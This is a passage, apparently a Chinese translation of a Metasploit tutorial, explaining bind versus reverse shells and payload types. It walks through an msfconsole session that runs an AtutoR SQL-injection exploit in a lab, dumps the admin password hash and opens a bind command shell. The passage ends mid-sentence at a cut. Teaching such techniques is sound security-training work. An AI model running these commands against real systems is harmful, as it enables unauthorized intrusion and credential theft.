  \n## shell 类型\n\n在进入下一个主题之前，让我们谈谈可用的不同类型的 shell。查看可用 shell 的列表时，它们分为两类：bind 和 reverse。\n\
  \nbind shell 指示目标启动命令 shell 并在本地端口上监听，允许攻击者连接到目标的监听端口。bind shell 对于本地漏洞非常有用，例如，当你已通过钓鱼攻击入侵目标机器并希望利用本地服务进行权限提升时；然而，如今它不适合大多数远程利用场景，因为目标可能位于防火墙之后。\n\
  \n因此，大多数情况下我们会使用 reverse shell 作为 payload。reverse shell 会与攻击者机器建立连接，在这种情况下，攻击者机器是打开本地端口并监听连接的一方，并且由于大多数出站规则更宽松，reverse\
  \ shell 更有可能绕过防火墙。\n\n## Payloads\n\nMetasploit Framework 中有三种不同的 payload 模块类型：singles、stag\
  \ ers 和 stages。Singles 是自包含且完全独立的 payload。\n\n一个 single payload 可以简单到向目标系统添加用户或运行可执行文件。\n\
  \nstager 会在攻击者和受害者之间建立网络连接，并且设计为小巧可靠。\n\nstages 是由 stager 下载的 payload 组件，提供高级功能且没有大小限制，例如\
  \ dllinject、meterpreter、patchupdllinject、upexec、vncinject 等。\n\n## 准备工作\n\n由于我们已有来自上一个教程的工作漏洞利用，我们将使用它来测试不同类型的\
  \ payload。\n\n## 如何操作...\n\n- 1. 首先，我们将使用 show payloads 命令显示所有兼容的 payload：\n\n![](img/6b6e557533100c0e47951d0e5e14c4ee_458_0.png)\n\
  \n\n\n\n2. 要获取有关特定 payload 的更多信息，我们可以使用 info 命令，后跟 payload 名称：\n\n```\nmsf exploit(atutor_sqli)\
  \ > info payload/generic/shell_bind_tcp\n\nName: Generic Command Shell, Bind TCP\
  \ Inline\nModule: payload/generic/shell_bind_tcp\nPlatform: All\n...\nProvided by:\n\
  \ skape <mmiller@hick.org>\n```\n\n基本选项：\n\n| 名称 | 当前设置 | 必需 | 描述 |\n|------|-----------------|----------|-------------|\n\
  | LPORT | 4444 | yes | 监听端口 |\n| RHOST |  | no | 目标地址 |\n\n描述：\n 侦听连接并生成一个命令 shell\n\
  \n```\nmsf exploit(atutor_sqli) >\n```\n\n3. generic/shell_bind_tcp 是一个独立的通用 bind\
  \ TCP 命令 shell。要将 shell_bind_tcp 选择为我们的 payload，我们使用 set PAYLOAD 命令，后跟 payload 名称：\n\
  \n```\nmsf exploit(atutor_sqli) > set PAYLOAD generic/shell_bind_tcp\nPAYLOAD =>\
  \ generic/shell_bind_tcp\nmsf exploit(atutor_sqli) > exploit\n\n[*] Started bind\
  \ handler\n[*] 192.168.216.136:80 - Dumping the username and password hash...\n\
  [+] 192.168.216.136:80 - Got the admin's hash:\n5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8\
  \ !\n[*] Command shell session 1 opened (192.168.216.5:41033 -> 192.168.216.136:4444)\
  \ at 2017-10-26 10:33:45 -0400\n[+] 192.168.216.136:80 - Deleted soae.php\n[!] Tried\
  \ to delete /var/content/module/mgp/soae.php, unknown result\n\n...\nBackground\
  \ session 1? [y/N] y\nmsf exploit(atutor_sqli) >\n```\n\n4. 使用 generic/shell_bind_tcp，我们获得了一个通用命令\
